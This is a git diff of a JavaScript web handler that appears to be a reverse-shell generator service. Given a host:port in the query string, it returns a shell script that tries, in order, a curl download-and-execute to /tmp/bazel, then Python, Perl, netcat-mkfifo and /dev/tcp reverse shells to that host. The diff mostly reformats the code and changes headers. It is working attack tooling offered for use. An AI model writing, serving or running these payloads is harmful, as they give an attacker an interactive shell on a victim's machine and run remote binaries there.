@@ -1,7 +1,6 @@
 'use strict';
 
-const usage = `
-<!DOCTYPE html>
+const usage = `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -81,42 +80,51 @@ const usage = `
 `;
 
 const reverseShell = (address = '') => {
-    const [host, port] = address.split(':');
-    if (!host || !port) {
-        return usage;
-    }
-    console.log(`Host is: ${host}:${port}`);
+                const [host, port] = address.split(':');
+                if (!host || !port) {
+                        return usage;
+                } else{
+                console.log(`Host is: ${host}:${port}`);
 
-    const payloads = {
-        curl: `curl https://${host} --output /tmp/bazel && chmod +x /tmp/bazel && /tmp/bazel`,
-        python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
-        perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
-        nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
-        sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`
-    };
 
-    return Object.entries(payloads).reduce((script, [cmd, payload]) => {
-        script += `
+                const payloads = {
+                                        curl: `curl https://${host} --output /tmp/bazel && chmod +x /tmp/bazel && /tmp/bazel`,
+                                        python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
+                                        perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+                                        nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
+                                        sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`
+                          };
 
-if command -v ${cmd} > /dev/null 2>&1; then
-    ${payload}
-    exit;
-fi`;
+                return Object.entries(payloads).reduce((script, [cmd, payload]) => {
+                                        script += `
 
-        return script;
-    }, usage);
+                                        if command -v ${cmd} > /dev/null 2>&1; then
+                                                ${payload}
+                                                        exit;
+                                                        fi`;
+
+                                        return script;
+                                }, '');
+                }
 };
 
 const handler = (request, response) => {
-    const address = request.query.address;
-    console.log(address);
+                const  address = request.query.address;
 
-    const one_month = 60 * 60 * 24 * 30;
-
-    response.setHeader('Content-Type', 'text/plain');
-    response.setHeader('Cache-Control', `s-maxage=${one_month}`); // Cache at edge
-    response.send(reverseShell(address));
+                const one_month = 60 * 60 * 24 * 30;
+                if(!address){
+                        console.log("Address is undefined")
+                        response.setHeader('Content-Type', 'text/html; charset=utf-8');
+                }
+                else{
+                        console.log(address);
+                        response.setHeader('Content-Type','text/plain');
+                }
+                response.setHeader('Cache-Control', `no-cache`); // Cache at edge
+                response.send(reverseShell(address));
 };
 
 module.exports = handler;
+
 module.exports.reverseShell = reverseShell;
+
